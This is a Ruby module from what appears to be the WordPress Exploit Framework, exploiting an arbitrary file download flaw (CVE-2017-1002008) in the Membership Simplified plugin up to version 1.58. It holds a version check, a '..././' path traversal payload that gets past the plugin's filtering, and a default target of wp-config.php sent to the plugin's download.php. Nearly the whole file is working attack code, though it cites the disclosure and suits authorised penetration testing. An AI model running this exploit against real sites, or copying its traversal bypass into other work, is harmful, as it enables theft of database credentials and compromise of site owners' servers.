class Wpxf::Auxiliary::MembershipSimplifiedArbitraryFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Membership Simplified <= 1.58 Arbitrary File Download',
      desc: %(
        This module exploits a vulnerability which allows you to download any arbitrary file accessible
        by the user the web server is running as. Relative paths must use "..././" as opposed to "../",
        in order to bypass mitigation within the plugin.
      ),
      author: [
        'Larry W. Cashdollar',             # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['CVE', '2017-1002008'],
        ['WPVDB', '8777'],
        ['URL', 'http://www.vapidlabs.com/advisory.php?v=187']
      ],
      date: 'Mar 13 2017'
    )
  end

  def check
    changelog = normalize_uri(wordpress_url_plugins, 'membership-simplified-for-oap-members-only', 'readme.txt')
    check_version_from_custom_file(changelog, /\=\s+Beta\s+(\d+\.\d+(\.\d+)*)\s+\=/, '1.59')
  end

  def default_remote_file_path
    '..././..././..././wp-config.php'
  end

  def working_directory
    'wp-content/plugins/membership-simplified-for-oap-members-only'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'membership-simplified-for-oap-members-only', 'download.php')
  end

  def download_request_params
    { 'download_file' => remote_file }
  end
end
